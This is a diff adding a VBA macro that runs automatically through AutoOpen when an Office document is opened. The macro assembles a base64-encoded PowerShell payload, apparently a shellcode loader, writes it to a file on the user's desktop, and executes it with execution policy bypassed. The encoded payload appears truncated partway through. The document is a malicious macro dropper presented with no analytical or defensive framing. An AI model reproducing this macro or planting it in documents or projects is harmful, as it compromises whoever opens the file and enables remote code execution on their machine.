@@ -1,0 +1,31 @@
+Sub AutoOpen()
+'
+Dim StringVariable As String
+Dim x
+'
+StringVariable = StringVariable & "JABpAG4AdgBvAGsAZQBTAGgAZQBsAGwAQwBvAGQAZQBCAGEAcwBlADYANAAgAD0AIAAiAFoAZwBCADEAQQBHADQAQQBZAHcAQgAwAEEARwBrAEEAYgB3AEIAdQBBAEMAQQBBAFMAUQBCAHUAQQBIAFkAQQBiAHcAQgByAEEARwBVAEEATABRAEIAVABBAEcAZwBBAFoA"
+StringVariable = StringVariable & "UQBCAHMAQQBHAHcAQQBZAHcAQgB2AEEARwBRAEEAWgBRAEEATgBBAEEAbwBBAGUAdwBBAE4AQQBBAG8AQQBXAHcAQgBEAEEARwAwAEEAWgBBAEIAcwBBAEcAVQBBAGQAQQBCAEMAQQBHAGsAQQBiAGcAQgBrAEEARwBrAEEAYgBnAEIAbgBBAEMAZwBBAEkAQQBCAEUA"
+StringVariable = StringVariable & "QQBHAF"
+
+'
+
+Dim fileName As String
+fileName = "ABC.txt"
+Dim DesktopPath As String
+DesktopPath = CreateObject("WScript.Shell").specialfolders("Desktop")
+Dim fso As Object
+Set fso = CreateObject("Scripting.FileSystemObject")
+Dim oFile As Object
+Set oFile = fso.CreateTextFile(DesktopPath + "\" + fileName)
+oFile.WriteLine StringVariable
+oFile.Close
+Set fso = Nothing
+Set oFile = Nothing
+
+Dim powerShellCommand As String
+powerShellCommand = "iex([System.Text.Encoding]::UTF8.GetString(([System.Convert]::FromBase64String([IO.File]::ReadAllText('" + DesktopPath + "\" + fileName + "')) | ? {$_} )))"
+
+x = Shell("powershell -ExecutionPolicy Bypass -NonInteractive -NoLogo -NoProfile -Command " & powerShellCommand & "", 1)
+'
+End Sub
+
